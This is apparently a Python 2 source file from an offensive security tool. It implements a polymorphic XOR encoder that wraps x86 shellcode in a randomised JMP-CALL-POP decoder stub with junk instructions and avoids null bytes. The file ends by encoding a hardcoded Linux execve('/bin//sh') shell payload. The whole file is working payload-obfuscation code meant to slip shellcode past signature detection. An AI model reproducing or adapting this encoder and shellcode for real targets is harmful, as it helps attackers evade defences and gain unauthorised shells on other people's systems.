from capstone import *
from random import randint
from itertools import product
from sys import setrecursionlimit
from sys import exit
from polymoly import *
import re

__author__ = "B3mB4m"
__copyright__ = "Copyright 2016 Bomberman Company"

__license__ = "MIT"
__version__ = "0.1"
__email__ = "b3mb4m@protonmail.com"

"""
The MIT License (MIT)

Copyright (c) 2016 B3mB4m

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

"""

setrecursionlimit(9999)
def xorme( shellcode):
	cache = shellcode
	mylist = ["".join(x) for x in list(product("ABCDEF", repeat=2))]
	insert = mylist[randint(0,len(mylist)-1)]
	xorfirst = [x for x in instructions().random1byte( "inc,dec", "eax,ebx,edx,edi")]
	header = xorfirst[randint(0, len(xorfirst)-1)]
	header += r"\xEB\x0D"
	header += xorfirst[randint(0, len(xorfirst)-1)]
	header += r"\x5E"
	header += xorfirst[randint(0, len(xorfirst)-1)]
	header += r"\x80\x36" #xor byte [esi],0xbe
	header += r"\x"+insert
	header += r"\x74\x0A"
	header += r"\x46"     #inc esiinc esi
	header += xorfirst[randint(0, len(xorfirst)-1)]
	header += r"\xEB\xF7"
	header += xorfirst[randint(0, len(xorfirst)-1)]
	header += r"\xE8\xEF\xFF\xFF\xFF"


	encode = ""
	for x in bytearray(cache.decode("hex")):
		y = x^int("0x"+insert, 16)
		test = r'\x%02x' % y
		encode += test

	header += encode.upper()
	header += r"\x"+insert
	
	if r"\x00" in header.lower():
		xorme( shellcode)
	return header.lower().replace("\\x", "")




def start( shellcode):
	try:
		control = True
		while control == True:
			qe = re.findall("..?", xorme( shellcode))
			if "00" in qe:
				qe = re.findall("..?", xorme( shellcode))
				control = True
			else:
				control = False
		return "".join(qe)

	except Exception as error:
		pass



def prestart( data, roll=None):
	cache = True
	if roll == None or roll == 1:
		data = start(data) 
	elif roll > 25:
		return "This script is still BETA.Please do not use iteration more than 25 times."
	else:
		cache = False
		for x in range(int(roll)):
			if data == "After roll 9999 times,payload generate failed.":
				cache = True
				break
			data = start( data)


	qe = re.findall("..?", data)
	return "\\x"+"\\x".join(qe).lower()





for x in range(4):
	print prestart( "31c050682f2f7368682f62696e89e389c2b00bcd80")
